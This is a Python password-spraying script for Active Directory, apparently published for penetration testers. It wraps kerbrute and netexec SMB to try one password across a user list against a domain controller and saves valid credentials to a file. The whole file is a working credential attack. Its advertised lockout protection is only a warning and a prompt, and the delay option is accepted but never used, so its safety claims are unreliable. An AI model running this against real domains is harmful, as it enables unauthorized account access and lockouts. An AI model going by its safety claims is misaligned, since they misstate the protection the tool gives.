#!/usr/bin/env python3
"""
password-spray.py — Safe AD Password Spray Tool
Author: Vimal Raj M | github.com/vimalraj-sec
Purpose: Kerberos-based password spray with built-in lockout protection

Usage:
  python3 password-spray.py -u users.txt -p Password123! -d corp.local --dc 10.10.10.100
  python3 password-spray.py -u users.txt -p Password123! -d corp.local --dc 10.10.10.100 --delay 5
  python3 password-spray.py -u users.txt -p Password123! -d corp.local --dc 10.10.10.100 --lockout-threshold 5

Requires:
  pip install impacket --break-system-packages

⚠️ For authorized penetration testing only.
⚠️ Always retrieve password policy before spraying — check lockout threshold.
"""

import argparse
import subprocess
import sys
import os
import time


def check_policy_warning(lockout_threshold, delay):
    """Warn if spray settings may cause lockouts."""
    if lockout_threshold > 0 and delay == 0:
        print(f"[!] WARNING: Lockout threshold is {lockout_threshold} — no delay set.")
        print(f"[!] Recommended: --delay 5 (5s between users) to reduce noise.")
    if lockout_threshold == 0:
        print(f"[*] Lockout threshold = 0 → no account lockout policy. Safe to spray.")


def spray_via_kerbrute(users_file, password, domain, dc_ip, delay, output_file):
    """Spray using kerbrute (Kerberos — faster, less noisy)."""
    print(f"\n[*] Method     : kerbrute passwordspray")
    print(f"[*] Password   : {password}")
    print(f"[*] Started at : {time.strftime('%H:%M:%S')}")

    cmd = [
        'kerbrute', 'passwordspray',
        '-d', domain,
        '--dc', dc_ip,
        users_file,
        password
    ]

    result = subprocess.run(cmd, capture_output=False, text=True)

    # kerbrute writes VALID hits to stdout — parse after
    print(f"[*] Spray complete at: {time.strftime('%H:%M:%S')}")
    return result.returncode


def spray_via_nxc(users_file, password, domain, dc_ip, output_file):
    """Spray using netexec SMB (broader coverage, slightly noisier)."""
    print(f"\n[*] Method     : netexec smb")
    print(f"[*] Password   : {password}")
    print(f"[*] Started at : {time.strftime('%H:%M:%S')}")

    cmd = [
        'nxc', 'smb', dc_ip,
        '-u', users_file,
        '-p', password,
        '--continue-on-success'
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    # Parse hits
    hits = [line for line in result.stdout.splitlines() if '[+]' in line]

    print(result.stdout)

    if hits:
        with open(output_file, 'a') as f:
            for hit in hits:
                print(f"[+] HIT: {hit.strip()}")
                f.write(f"{hit.strip()}\n")

    print(f"[*] Spray complete at: {time.strftime('%H:%M:%S')}")
    print(f"[*] Hits: {len(hits)}")
    return len(hits)


def load_users(path):
    """Load user list from file."""
    try:
        with open(path, 'r') as f:
            return [u.strip() for u in f if u.strip() and not u.startswith('#')]
    except FileNotFoundError:
        print(f"[!] Users file not found: {path}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description='Safe AD Password Spray — Kerberos-based with lockout protection'
    )
    parser.add_argument('-u', '--users', required=True,
                        help='Path to users file (one per line)')
    parser.add_argument('-p', '--password', required=True,
                        help='Password to spray')
    parser.add_argument('-d', '--domain', required=True,
                        help='Domain (e.g. corp.local)')
    parser.add_argument('--dc', required=True,
                        help='DC IP address')
    parser.add_argument('--delay', type=int, default=0,
                        help='Delay in seconds between users (default: 0)')
    parser.add_argument('--lockout-threshold', type=int, default=3,
                        help='Estimated lockout threshold — for warning display (default: 3)')
    parser.add_argument('--method', choices=['kerbrute', 'nxc'], default='kerbrute',
                        help='Spray method: kerbrute (default) or nxc')
    parser.add_argument('-o', '--output', default='creds/spray-hits.txt',
                        help='Output file for hits (default: creds/spray-hits.txt)')
    args = parser.parse_args()

    users = load_users(args.users)

    print(f"\n{'='*60}")
    print(f"  AD Password Spray Tool")
    print(f"{'='*60}")
    print(f"  Domain     : {args.domain}")
    print(f"  DC IP      : {args.dc}")
    print(f"  Users      : {len(users)} loaded from {args.users}")
    print(f"  Password   : {args.password}")
    print(f"  Method     : {args.method}")
    print(f"  Lockout    : threshold {args.lockout_threshold} (retrieved from policy?)")
    print(f"  Delay      : {args.delay}s between users")
    print(f"  Output     : {args.output}")
    print(f"{'='*60}\n")

    check_policy_warning(args.lockout_threshold, args.delay)

    # Create output dir if needed
    os.makedirs(os.path.dirname(args.output) if os.path.dirname(args.output) else '.', exist_ok=True)

    confirm = input("\n[?] Ready to spray? Check lockout policy first. Continue? (yes/no): ")
    if confirm.lower() != 'yes':
        print("[*] Aborted.")
        sys.exit(0)

    if args.method == 'kerbrute':
        spray_via_kerbrute(
            args.users, args.password, args.domain,
            args.dc, args.delay, args.output
        )
    else:
        spray_via_nxc(
            args.users, args.password, args.domain,
            args.dc, args.output
        )

    print(f"\n[*] Done. Check {args.output} for hits.")
    print(f"[*] Verify hits with: nxc smb {args.dc} -u USER -p PASS")


if __name__ == '__main__':
    main()
